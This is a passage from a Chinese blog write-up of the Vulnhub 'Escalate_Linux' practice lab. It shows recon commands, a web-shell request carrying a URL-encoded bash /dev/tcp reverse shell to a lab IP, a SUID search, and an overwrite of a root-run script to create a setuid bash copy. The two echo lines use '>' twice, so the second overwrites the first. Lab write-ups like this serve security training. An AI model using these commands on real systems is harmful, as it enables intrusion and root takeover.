@@ -1,0 +1,962 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Dota_128px_1143945_easyicon.net.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mamor5409.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+
+  <meta property="og:type" content="article">
+<meta property="og:title" content="Escalate_Linux">
+<meta property="og:url" content="http://mamor5409.github.io/posts/c474af54/index.html">
+<meta property="og:site_name" content="Mamor&#39;s Blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:94930f0a253a4c92ff1f902734f63eb9">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/94930f0a253a4c92ff1f902734f63eb9.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:39e91f782fa7b4cb47a3bc998e536e37">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/39e91f782fa7b4cb47a3bc998e536e37.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:5faefc7f5a065601e96c0591c39093f8">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/5faefc7f5a065601e96c0591c39093f8.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:784f5ab67cc5fad33e9cf5229f5cba45">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/784f5ab67cc5fad33e9cf5229f5cba45.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:320f2f6f2f837a9e3ed2d71aca89af52">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/320f2f6f2f837a9e3ed2d71aca89af52.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:082ea51331a7f3fb0c5ad2da6da3e829">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/082ea51331a7f3fb0c5ad2da6da3e829.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:f790198318d6609601f07e5740f24ca2">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/f790198318d6609601f07e5740f24ca2.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:9aa3d1c884bddf01c9018fd19435ba30">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/9aa3d1c884bddf01c9018fd19435ba30.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:d6f26b099d84f99e220ab628f847a8e8">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/d6f26b099d84f99e220ab628f847a8e8.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:26b748ad262da271a6c711562135cfc3">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/26b748ad262da271a6c711562135cfc3.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:176f980f1664bc1f90c0aa7afb639c6a">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/176f980f1664bc1f90c0aa7afb639c6a.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:d35b162929866a2a5bc12bf8d5fa9237">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/d35b162929866a2a5bc12bf8d5fa9237.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:daa3614e8e8848928186e9971a067ed8">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/daa3614e8e8848928186e9971a067ed8.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:e7006cbfd204060997512aeb7aa744be">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/e7006cbfd204060997512aeb7aa744be.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:31d18615d165604e35a7cebc4f344323">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/31d18615d165604e35a7cebc4f344323.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:b1588e89ae861b651cf5a8be3909943c">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/b1588e89ae861b651cf5a8be3909943c.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:3683702f1e958e4ae63d29ab57f2f702">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/3683702f1e958e4ae63d29ab57f2f702.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:76cb7fa7b526dde9a194c55ab52b7c01">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/76cb7fa7b526dde9a194c55ab52b7c01.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:e5bbbde063cb63ba9fb8daf9bae3fea3">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/e5bbbde063cb63ba9fb8daf9bae3fea3.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:3dce7fca2f3771cc7eca0d6d2de137b3">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/3dce7fca2f3771cc7eca0d6d2de137b3.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:85454cede9f9ede13abcf5c46c06c18a">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/85454cede9f9ede13abcf5c46c06c18a.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:4f86485d7a014236d4c0da8997dbfe66">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/4f86485d7a014236d4c0da8997dbfe66.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:fc515af20eda2b650b1fe5ad634d85d8">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/fc515af20eda2b650b1fe5ad634d85d8.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:786d81cf96178ab0df36bdf054416ee8">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/786d81cf96178ab0df36bdf054416ee8.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:582472a05e2291085421362b71769f72">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/582472a05e2291085421362b71769f72.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:8826051f156c1a996ed0950c5e9ff665">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/8826051f156c1a996ed0950c5e9ff665.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:e583500b9bd49f8f17f6c5d8e6649d57">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/e583500b9bd49f8f17f6c5d8e6649d57.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:83f91e6debac4dcc69df911bdc3c239f">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/83f91e6debac4dcc69df911bdc3c239f.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:6d355031cd6c43eb447e8213f0833a7d">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/6d355031cd6c43eb447e8213f0833a7d.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:a7b3a912ff51397434d18c082b133d54">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/a7b3a912ff51397434d18c082b133d54.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:9e2d8c564912663dcc3a3e4ee181e751">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/9e2d8c564912663dcc3a3e4ee181e751.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:3e5c34d015669144524e073997b6290b">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/3e5c34d015669144524e073997b6290b.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:1ac6b364e251fd2be2a7d968e082c14c">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/1ac6b364e251fd2be2a7d968e082c14c.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:10cc90cd82f2e5d2c0ede1393eba99c5">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/10cc90cd82f2e5d2c0ede1393eba99c5.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:47c0ea209eb2ab89e9e8f050dbe3c484">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/47c0ea209eb2ab89e9e8f050dbe3c484.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:0ee35a1a8389a3f7be0d119570066355">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/0ee35a1a8389a3f7be0d119570066355.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:ed45f5c91b693f398b9d78415e9f6137">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/ed45f5c91b693f398b9d78415e9f6137.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:a814e593c544373206b840a1bcec7950">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/a814e593c544373206b840a1bcec7950.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:0b9db52b928c8be4e42773ae56c54197">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/0b9db52b928c8be4e42773ae56c54197.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:2880a7402f7c4210518eb33e87c2c1c4">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/2880a7402f7c4210518eb33e87c2c1c4.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:914fe068e9208e26fbaf1fb37c59d12e">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/914fe068e9208e26fbaf1fb37c59d12e.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:bd93e89c27d81a9bddee7d519689fbe1">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/bd93e89c27d81a9bddee7d519689fbe1.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/c474af54/attachment:c196a2bbdcaeb87acdf306ad8f49017c">
+<meta property="og:image" content="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/c196a2bbdcaeb87acdf306ad8f49017c.png">
+<meta property="article:published_time" content="2023-10-23T10:43:12.000Z">
+<meta property="article:modified_time" content="2023-10-23T10:55:59.985Z">
+<meta property="article:author" content="Mamor">
+<meta property="article:tag" content="OSCP打靶">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://mamor5409.github.io/posts/c474af54/attachment:94930f0a253a4c92ff1f902734f63eb9">
+
+<link rel="canonical" href="http://mamor5409.github.io/posts/c474af54/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Escalate_Linux | Mamor's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Mamor's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Mamor's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-commonweal">
+
+    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://mamor5409.github.io/posts/c474af54/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/kabi.jpg">
+      <meta itemprop="name" content="Mamor">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mamor's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Escalate_Linux
+        </h1>
+
+        <div class="post-meta">
+
+			
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-10-23 18:43:12 / 修改时间：18:55:59" itemprop="dateCreated datePublished" datetime="2023-10-23T18:43:12+08:00">2023-10-23</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/OSCP%E6%89%93%E9%9D%B6/" itemprop="url" rel="index"><span itemprop="name">OSCP打靶</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>6.1k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>6 分钟</span>
+            </span>
+            <div class="post-description"> </div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在日常渗透测试过程中，通常会先拿到webshell，当拿到的权限过低时，需要提升权限近一步渗透。本篇将以Vulnhub的<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/escalate_linux-1,323/">Escalate_Linux</a>靶场为例，总结一下linux环境下常见的提权方法。</p>
+<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>探测发现主机 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo netdiscovert -r 192.168.80.1/24</span><br></pre></td></tr></table></figure>
+
+<p>找到靶机IP 192.168.80.53 （由于网络变动 靶机ip后面会变化）</p>
+<p>端口扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -Pn -sV 192.168.80.53</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c474af54/attachment:94930f0a253a4c92ff1f902734f63eb9" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/94930f0a253a4c92ff1f902734f63eb9.png" alt="截图"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sVC -p- 192.168.80.53</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c474af54/attachment:39e91f782fa7b4cb47a3bc998e536e37" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/39e91f782fa7b4cb47a3bc998e536e37.png" alt="截图"></p>
+<p>存在http web服务、139、445、smb、nfs</p>
+<p>先看下http服务</p>
+<p>访问为Apache 默认页面  dirsearch 扫下目录  </p>
+<p><img src="/posts/c474af54/attachment:5faefc7f5a065601e96c0591c39093f8" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/5faefc7f5a065601e96c0591c39093f8.png" alt="截图"></p>
+<p>发现存在 shell.php  普通用户权限</p>
+<p><img src="/posts/c474af54/attachment:784f5ab67cc5fad33e9cf5229f5cba45" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/784f5ab67cc5fad33e9cf5229f5cba45.png" alt="截图"></p>
+<p><img src="/posts/c474af54/attachment:320f2f6f2f837a9e3ed2d71aca89af52" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/320f2f6f2f837a9e3ed2d71aca89af52.png" alt="截图"></p>
+<p><img src="/posts/c474af54/attachment:082ea51331a7f3fb0c5ad2da6da3e829" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/082ea51331a7f3fb0c5ad2da6da3e829.png" alt="截图"></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>利用nc 反弹bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.80.56/3344 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>利用burpsuite 进行url编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%38%30%2e%37%33%2f%33%33%34%34%20%3e%26%31%27 </span><br></pre></td></tr></table></figure>
+
+<p>反弹得到shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /shell.php?cmd=%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%38%30%2e%35%36%2f%33%33%34%34%20%30%3e%26%31%27 </span><br><span class="line">HTTP/1.1</span><br><span class="line">Host: 192.168.80.53</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c474af54/attachment:f790198318d6609601f07e5740f24ca2" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/f790198318d6609601f07e5740f24ca2.png" alt="截图"></p>
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><h4 id="0x00-LinEnum脚本枚举"><a href="#0x00-LinEnum脚本枚举" class="headerlink" title="0x00 LinEnum脚本枚举"></a>0x00 LinEnum脚本枚举</h4><p><a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh</a></p>
+<p><img src="/posts/c474af54/attachment:9aa3d1c884bddf01c9018fd19435ba30" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/9aa3d1c884bddf01c9018fd19435ba30.png" alt="截图"></p>
+<h4 id="0x01-SUID提权"><a href="#0x01-SUID提权" class="headerlink" title="0x01 SUID提权"></a>0x01 SUID提权</h4><p><img src="/posts/c474af54/attachment:d6f26b099d84f99e220ab628f847a8e8" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/d6f26b099d84f99e220ab628f847a8e8.png" alt="截图"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c474af54/attachment:26b748ad262da271a6c711562135cfc3" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/26b748ad262da271a6c711562135cfc3.png" alt="截图"></p>
+<p>user3下 执行可直接得到root权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /home/user3 </span><br><span class="line">ls -l</span><br><span class="line">./shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c474af54/attachment:176f980f1664bc1f90c0aa7afb639c6a" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/176f980f1664bc1f90c0aa7afb639c6a.png" alt="截图"></p>
+<p><img src="/posts/c474af54/attachment:d35b162929866a2a5bc12bf8d5fa9237" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/d35b162929866a2a5bc12bf8d5fa9237.png" alt="截图"></p>
+<p>除了shell之外 还存在一个root权限且具有写入权限的 .script.sh 脚本 利用该脚本将bash写到tmp下并给予s权限</p>
+<p><img src="/posts/c474af54/attachment:daa3614e8e8848928186e9971a067ed8" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/daa3614e8e8848928186e9971a067ed8.png" alt="截图"></p>
+<p>echo “cp /bin/bash /tmp/sh” &gt; .script.sh echo “chmod +s /tmp/sh” &gt; .script.sh</p>
+<p><img src="/posts/c474af54/attachment:e7006cbfd204060997512aeb7aa744be" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/e7006cbfd204060997512aeb7aa744be.png" alt="截图">    </p>
+<p>./shell</p>
